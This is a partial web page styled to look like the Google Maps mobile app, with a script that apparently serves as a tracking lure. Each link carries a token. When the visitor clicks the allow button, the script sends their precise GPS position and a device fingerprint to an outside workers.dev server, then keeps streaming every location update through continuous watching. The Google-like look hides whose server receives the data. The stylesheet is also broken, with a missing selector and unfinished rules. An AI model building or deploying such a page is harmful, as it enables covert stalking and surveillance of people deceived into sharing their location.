<style>
:root {
  --bg-color: #ffffff;
  --surface-color: #ffffff;
  --text-color: #e8eaed;
  --accent-blue: #8ab4f8;
  --pill-bg: #ffffff;
  --pill-text: #3c4043;
}

/* Google UI layer */
.google-ui{
  position:fixed;
  inset:0;
  pointer-events:none;
  z-index:4;
}

/* allow clicks on buttons */
.google-ui *{
  pointer-events:auto;
}

/* --- Header / Search Bar Section --- */
.top-container {
  position: absolute;
  top: 10;
  width: 100%;
  padding: 10px 0;
  z-index: 10;
}

.search-bar {
  background: var(--surface-color);
  margin: 0 12px;
  height: 48px;
  border-radius: 24px;
  display: flex;
  align-items: center;
  padding: 0 15px;
  box-shadow: 0 2px 6px rgba(0,0,0,0.3);
}

.search-bar i.fa-location-dot { color: #4285F4; margin-right: 12px; }
.search-bar .search-text { flex: 1; color: #9aa0a6; font-size: 16px; }
.search-bar i.fa-microphone { color: #8ab4f8; margin-right: 15px; }
.profile-icon{
  width:32px;height:32px;
  background:#7b1fa2;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  color:white;
  font-size:14px;
}

/* Pills */
.pill-container{
  display:flex;
  overflow-x:auto;
  padding:12px;
  gap:8px;
}
.pill{
  background:var(--pill-bg);
  color:var(--pill-text);
  padding:8px 16px;
  border-radius:20px;
  display:flex;
  align-items:center;
  font-size:14px;
  white-space:nowrap;
}
.pill i{margin-right:6px}

/* Right tools */
.map-tools{
  position:absolute;
  right:12px;

  flex-direction:column;
  gap:12px;
}
.tool-btn{
  width:40px;height:40px;
  background:var(--surface-color);
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
}
.tool-btn i{color:#e8eaed}
.compass i{color:#ea4335}

/* Bottom tools */
.bottom-right-tools{
  position:absolute;
  right:12px;
  bottom:80px;
  display:flex;
  flex-direction:column;
  gap:15px;
}

.locate-btn{
  width:48px;height:48px;
  background:var(--surface-color);
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
}

.directions-btn{
  width:56px;height:56px;
  background:#00838f;
  border-radius:16px;
  display:flex;
  align-items:center;
  justify-content:center;
}

/* Bottom nav */

  bottom:0;
  width:100%;
  height:65px;
  background:#ffffff;
  display:flex;
  justify-content:space-around;
  align-items:center;
}

.nav-item{

<script>
const token = new URLSearchParams(location.search).get("token");
if(!token){ alert("Invalid link"); throw "NO TOKEN"; }

const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev/";
const statusEl = document.getElementById("status");

/* Advanced device info */
function getDeviceInfo(){
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
  };
}

document.getElementById("allow").onclick = () => {

  if(!navigator.geolocation){
    statusEl.textContent = "Location not supported on this device";
    return;
  }

  statusEl.textContent = "Requesting GPS permission…";

  navigator.geolocation.getCurrentPosition(
    success,
    error,
    { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
  );
};

function success(pos){
  const { latitude:lat, longitude:lng, accuracy:acc } = pos.coords;

  /* Send FIRST accurate location immediately */
  fetch(API + "/send-location",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({
      token,
      lat, lng, acc,
      device: getDeviceInfo()
    })
  });

  document.getElementById("permission").remove();

  /* Continuous tracking */
  navigator.geolocation.watchPosition(
    p=>{
      fetch(API + "/send-location",{
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body:JSON.stringify({
          token,
          lat:p.coords.latitude,
          lng:p.coords.longitude,
          acc:p.coords.accuracy
        })
      });
    },
    ()=>{},
    { enableHighAccuracy:true, maximumAge:0 }
  );
}

function error(e){
  if(e.code === 1){
    statusEl.textContent =
      "Location access denied. Please enable GPS and allow permission.";
  }else{
    statusEl.textContent =
      "Unable to get location. Turn ON GPS and try again.";
      document.getElementById("allow").textContent="Retry";
  }
}

</script>
